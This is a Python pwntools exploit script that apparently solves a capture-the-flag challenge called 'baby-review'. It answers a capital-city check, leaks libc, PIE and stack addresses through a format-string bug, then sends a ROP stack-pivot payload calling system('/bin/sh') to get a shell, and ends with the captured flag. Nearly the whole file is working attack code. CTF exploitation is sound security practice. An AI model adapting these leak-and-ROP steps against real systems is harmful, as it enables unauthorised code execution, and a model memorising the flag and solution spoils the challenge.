#!/usr/bin/python3
from pwn import *
from countryinfo import CountryInfo

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript="c",*a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


exe = './baby-review'
elf = context.binary = ELF(exe, checksec=False)
libc = ELF("libc.so.6")
#libc = context.binary.libc

io = start()

# pass the countries check
io.recvuntil(b"What is the capital of ")
country = io.recvline().strip().decode()[:-1]
capital = CountryInfo(country).capital()
io.sendline(capital.encode())

# leaks
io.sendlineafter(b"4. Exit\n", b"5")
#io.sendlineafter(b"Enter your movie link here and I'll add it to the list\n", 100*b"%p ")

io.sendlineafter(b"Enter your movie link here and I'll add it to the list\n", b"%3$p%9$p%8$p")

# print leaks
io.sendlineafter(b"4. Exit\n", b"2")

for i in range(5):
    io.recvline()
leaks = io.recvline().strip()

# libc leak
leak_libc = int(leaks[:14], 16)
info(f"libc leak @ {hex(leak_libc)}")
libc.address = leak_libc - 0x114a37 #- (libc.sym.write + 16)
info(f"Libc base @ {hex(libc.address)}")

# Piebase
pie_leak = int(leaks[14:28],16)
elf.address = pie_leak - (elf.sym.menu + 198)
info(f"Piebase @ {hex(elf.address)}")

# stack address to pivot
stack_address = int(leaks[28:], 16)
info(f"Stack address @ {hex(stack_address)}")
# bof
system = p64(libc.sym.system)
binsh = p64(libc.address + 0x1d8698)
ret = p64(elf.address + 0x000000000000101a)
pop_rdi = p64(libc.address + 0x000000000002a3e5)
leave_ret = p64(libc.address + 0x562ec)

# stack pivot 
payload = pop_rdi + binsh + system + ret + p64(stack_address - 0x28) + leave_ret

io.sendlineafter(b"4. Exit\n", b"4")
io.sendafter(b"Could I get your name for my records?\n", payload)

io.interactive()

# pwn3ed!
# `dam{my_f4v0r173_15_bl4d3_runn3r_b1n6b0n6u}`
